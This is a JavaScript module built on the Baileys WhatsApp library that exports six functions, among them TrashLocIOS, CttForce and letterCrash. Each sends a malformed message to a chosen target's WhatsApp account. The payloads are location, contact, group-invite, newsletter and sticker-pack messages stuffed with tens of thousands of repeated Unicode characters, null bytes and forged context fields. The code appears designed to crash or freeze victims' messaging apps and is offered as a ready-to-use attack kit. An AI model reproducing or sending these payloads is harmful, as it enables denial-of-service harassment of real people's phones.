const { 
  default: baileys, proto, jidNormalizedUser, generateWAMessage, 
  generateWAMessageFromContent, getContentType, prepareWAMessageMedia 
} = require("@whiskeysockets/baileys");

const {
  downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, 
  generateWAMessageContent, makeInMemoryStore, MediaType, areJidsSameUser, 
  WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, 
  GroupMetadata, initInMemoryKeyStore, MiscMessageGenerationOptions, 
  useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, 
  WAFlag, WANode, WAMetric, ChatModification, MessageTypeProto, 
  WALocationMessage, WAContextInfo, WAGroupMetadata, ProxyAgent, 
  waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, 
  WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, 
  WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, 
  MediariyuInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, 
  WAMediaUpload, mentionedJid, processTime, Browser, MessageType, 
  Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, 
  GroupSettingChange, DisriyuectReason, WASocket, getStream, WAProto, 
  isBaileys, AnyMessageContent, fetchLatestBaileysVersion, 
  templateMessage, InteractiveMessage, generateMessageTag, generateMessageID, Header 
} = require("@whiskeysockets/baileys");

const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const os = require('os')
const axios = require('axios')
const fsx = require('fs-extra')
const crypto = require('crypto')
const ffmpeg = require('fluent-ffmpeg')
const sharp = require('sharp')
const jimp = require("jimp")
const moment = require('moment-timezone')
const babi = fs.readFileSync('./system/image/Hot.jpeg')
let client;

async function TrashLocIOS(client, target) {
   await client.relayMessage(target, {
    locationMessage: {
     degreesLatitude: -9.09999262999,
     degreesLongitude: 199.99963118999,
     jpegThumbnail: null,
     name: "🩸 𝐑͠𝐢̻𝐳͢𝐱ͯ𝐕̻𝐞͜𝐥̻𝐳͡ 𝐎͠𝐟̻𝐟͢𝐢͜𝐜ͯ𝐢̻𝐚̻𝐥-𝐈ͯ𝐃!" + "𑇂𑆵𑆴𑆿".repeat(10000),
     address: "denny Official!",
     url: `https://crash.apple.${"🩸".repeat(25000)}.com`,
     contextInfo: {
      quotedAd: {
       advertiserName: "x",
       mediaType: "IMAGE",
       jpegThumbnail: null,
       caption: "x"
      },
      placeholderKey: {
       remoteJid: "0@s.whatsapp.net",
       fromMe: false,
       id: "ABCDEF1234567890"
      }
     }
    }
   }, {})
  }
  
async function CttForce(client, target) {
  const displayName = "🩸 𝐑͠𝐢̻𝐳͢𝐱ͯ𝐕̻𝐞͜𝐥̻𝐳͡ 𝐎͠𝐟̻𝐟͢𝐢͜𝐜ͯ𝐢̻𝐚̻𝐥-𝐈ͯ𝐃" + "ោ៝".repeat(41);
  const vcard = `BEGIN:VCARD
VERSION:3.0
N:🩸 𝐑͠𝐢̻𝐳͢𝐱ͯ𝐕̻𝐞͜𝐥̻𝐳͡ 𝐎͠𝐟̻𝐟͢𝐢͜𝐜ͯ𝐢̻𝐚̻𝐥-𝐈ͯ𝐃;;;
FN:🩸 𝐑͠𝐢̻𝐳͢𝐱ͯ𝐕̻𝐞͜𝐥̻𝐳͡ 𝐎͠𝐟̻𝐟͢𝐢͜𝐜ͯ𝐢̻𝐚̻𝐥-𝐈ͯ𝐃
item1.TEL;waid=5521992999999:+55 219-9299-9999
item1.X-ABLabel:Server
X-WA-BIZ-NAME:${"\u0000".repeat(41)}
END:VCARD`;

  const contact = generateWAMessageFromContent(target, {
    contactMessage: {
      displayName,
      vcard,
      contextInfo: {
        mentionedJid: [target],
        participant: "5521992999999@s.whatsapp.net",
        remoteJid: target,
        forwardingScore: 9741,
        isForwarded: true,
        quotedMessage: {
        contactMessage: {
          displayName: "🩸 𝐑͠𝐢̻𝐳͢𝐱ͯ𝐕̻𝐞͜𝐥̻𝐳͡ 𝐎͠𝐟̻𝐟͢𝐢͜𝐜ͯ𝐢̻𝐚̻𝐥-𝐈ͯ𝐃", 
          vcard: vcard.vcard 
          }
        },
        businessMessageForwardInfo: {
          businessOwnerJid: "5521992999999@s.whatsapp.net"
        },
        dataSharingContext: {
          showMmDisclosure: true
        },
        forwardedNewsletterMessageInfo: {
          newsletterJid: "5521992999999@newsletter",
          serverMessageId: 1,
          newsletterName: "-"
        },
        externalAdReply: {
          title: "🩸 𝐑͠𝐢̻𝐳͢𝐱ͯ𝐕̻𝐞͜𝐥̻𝐳͡ 𝐎͠𝐟̻𝐟͢𝐢͜𝐜ͯ𝐢̻𝐚̻𝐥-𝐈ͯ𝐃" + "ោ៝".repeat(9741),
          mediaType: 2,
          renderLargerThumbnail: true,
          showAdAttribution: true,
          containsAutoReply: true,
          body: "© denny Official-ID",
          thumbnail: babi,
          sourceUrl: "",
          sourceId: client.generateMessageTag(),
          ctwaClid: "ctwaClid",
          ref: "ref",
          clickToWhatsappCall: true,
          ctaPayload: "ctaPayload",
          disableNudge: false,
          originalimgLink: "https://instagram.com/@RizxzWangsaff1205"
        },
        quotedAd: {
          advertiserName: "🩸 𝐑͠𝐢̻𝐳͢𝐱ͯ𝐕̻𝐞͜𝐥̻𝐳͡ 𝐎͠𝐟̻𝐟͢𝐢͜𝐜ͯ𝐢̻𝐚̻𝐥-𝐈ͯ𝐃",
          mediaType: "IMAGE",
          jpegThumbnail: babi,
          caption: "menipulation contact ?"
        },
        placeholderKey: {
          remoteJid: "5521992999999@s.whatsapp.net",
          fromMe: false,
          id: "ABCDEF1234567890"
        }
      }
    }
  }, { quoted: {
     key: { particiapant: "5521992999999@s.whatsapp.net", remoteJid: target, fromMe: true }, 
        message: { 
           contactMessage: {
              displayName: "🩸 𝐑͠𝐢̻𝐳͢𝐱ͯ𝐕̻𝐞͜𝐥̻𝐳͡ 𝐎͠𝐟̻𝐟͢𝐢͜𝐜ͯ𝐢̻𝐚̻𝐥-𝐈ͯ𝐃", 
              vcard: vcard.vcard 
           }
        }
     }  
  });

  await client.relayMessage(target, contact.message, {
    particiapant: { jid: target },
    messageId: contact.key.id
  });
}

async function StanzaContact(client, target) {
  const message = {
    extendedTextMessage: {
      text: "🩸 𝐑͠𝐢̻𝐳͢𝐱ͯ𝐕̻𝐞͜𝐥̻𝐳͡ 𝐎͠𝐟̻𝐟͢𝐢͜𝐜ͯ𝐢̻𝐚̻𝐥-𝐈ͯ𝐃",
      contextInfo: {
        stanzaId: generateMessageID(),
        participant: target,
        quotedMessage: {
          contactMessage: {
            displayName: "@denny",
            vcard: `BEGIN:VCARD
VERSION:3.0
FN:@zoro
X-WA-BIZ-NAME:@dennyinfinity

ORG:@dennyinfinity;
TEL;type=CELL;type=VOICE;waid=5521992999999:+55 21 99299-9999
END:VCARD`
          }
        }
      }
    }
  };

  await client.relayMessage(target, message, {});
}

async function invico2(client, target) {
const msg = {
    groupInviteMessage: {
      groupJid: "120363370626418572@g.us",
      inviteCode: "974197419741",
      inviteExpiration: "97419741",
      groupName: "�?" + "ោ៝".repeat(10000),
      caption: "🩸 𝐑͠𝐢̻𝐳͢𝐱ͯ𝐕̻𝐞͜𝐥̻𝐳͡ 𝐎͠𝐟̻𝐟͢𝐢͜𝐜ͯ𝐢̻𝐚̻𝐥-𝐈ͯ𝐃" + "ោ៝".repeat(10000),
      jpegThumbnail: null
    }
  };
  await client.relayMessage(target, msg, {
  participant: { jid: target }, 
  messageId: null
  })
}

async function letterCrash(client, target, Ptcp = true) {
  let virtex = "*🩸 𝐑͠𝐢̻𝐳͢𝐱ͯ𝐕̻𝐞͜𝐥̻𝐳͡ 𝐎͠𝐟̻𝐟͢𝐢͜𝐜ͯ𝐢̻𝐚̻𝐥-𝐈ͯ𝐃͢*" + "�?".repeat(77777) + "@1".repeat(77777);
  var messageContent = generateWAMessageFromContent(target, proto.Message.fromObject({
    viewOnceMessage: {
      message: {
        newsletterAdminInviteMessage: {
          newsletterJid: `120363319314627296@newsletter`,
          newsletterName: virtex,
          jpegThumbnail: "",
          caption: virtex,
          inviteExpiration: Date.now() + 1814400000
        },
        contextInfo: {
          mentionedJid: ["13135550002@s.whatsapp.net"],
          groupMentions: [
            {
              groupJid: `120363319314627296@newsletter`,
              groupSubject: virtex
            }
          ]
        }
      }
    }
  }), {
    userJid: target
  });

  await client.relayMessage(target, messageContent.message, {
    participant: { jid: target },
    messageId: messageContent.key.id
  });
}

async function StickerPack6(client, target) {
let memeknya = "�?".repeat(50000) + " �?".repeat(5000);
    var messageContent = generateWAMessageFromContent(
        target,
        proto.Message.fromObject({
          viewOnceMessage: {
            message: {
  stickerPackMessage: {
    stickerPackId: "b58c0f42-0d1f-48fc-a516-7821f4d8d7a0",
    name: "𝐓𝐡𝐞𝐄𝐱𝐭𝐨𝐫𝐝𝐢𝐭𝐜𝐯𝐙𝐚𝐩🐉" + memeknya,
    publisher: memeknya + `ꦾ`.repeat(5000),
    stickers: [
      {
        fileName: "rroK-d0l9EdduolvylB3XF6RKwnyiz0RKAQMWb7RMl4=.webp",
        isAnimated: false,
        emojis: [
          ""
        ],
        accessibilityLabel: "",
        isLottie: false,
        mimetype: "image/webp"
      },
      {
        fileName: "JWKop+ILOcOMUNvxzJ52pUKwzWEgMbYkKFlo-aBKcfY=.webp",
        isAnimated: false,
        emojis: [
          ""
        ],
        accessibilityLabel: "",
        isLottie: false,
        mimetype: "image/webp"
      }
    ],
    fileLength: "69832",
    fileSha256: "J1qUbwUO4z77FRY3YcJ2DsQkL+SLTYhvacH2jfcZZNk=",
    fileEncSha256: "2ZEtY/Lfza1MYM6yU7jvCNwFTsYKHLuU7d6XwX/1W5c=",
    mediaKey: "A192qGyrnYXtdftrXGS1/R/3qcB6wG46ybFNvuXw0w8=",
    directPath: "/v/t62.15575-24/27352554_9405543626240762_2450036504553609989_n.enc?ccb=11-4&oh=01_Q5Aa1QFxiY3tujF8LmhWFx_gf4uMfQ2e544QIygRxw6wqt78cw&oe=68406780&_nc_sid=5e03e0",
    contextInfo: {},
    mediaKeyTimestamp: "1746459896",
    trayIconFileName: "b58c0f42-0d1f-48fc-a516-7821f4d8d7a0.png",
    thumbnailDirectPath: "/v/t62.15575-24/11410555_1219244196575326_7771742087005735253_n.enc?ccb=11-4&oh=01_Q5Aa1QEE9w6Kxf3WA3mH-_CcLiRcGVM29PNP1OJ9Z-kwv1mzwg&oe=684036A4&_nc_sid=5e03e0",
    thumbnailSha256: "UJxXSKrCVS9g/e/Ai39k62XEeTETrof25srXus8fkSA=",
    thumbnailEncSha256: "ufsZpeTyo10n1OPuYUsqPO01W6/vTrSepULAicGOFi8=",
    thumbnailHeight: 252,
    thumbnailWidth: 252,
    imageDataHash: "M2UxNGQzOGE0NThhM2VmNWFkYTUyZmQ3NzE0MWMwNWZjZjkwODM3NjFjOTY4MDljZjVhOWY0ZWVmZGU3ZWI3YQ==",
    stickerPackSize: "69233",
    stickerPackOrigin: "USER_CREATED"
              },
            },
          },
        }),
        {
          userJid: target,
        }
      );
await client.relayMessage(target, messageContent.message, {
        participant: {
          jid: target,
        },
        messageId: messageContent.key.id,
      });
    }

module.exports = { CttForce, StanzaContact, TrashLocIOS, invico2, letterCrash, StickerPack6 }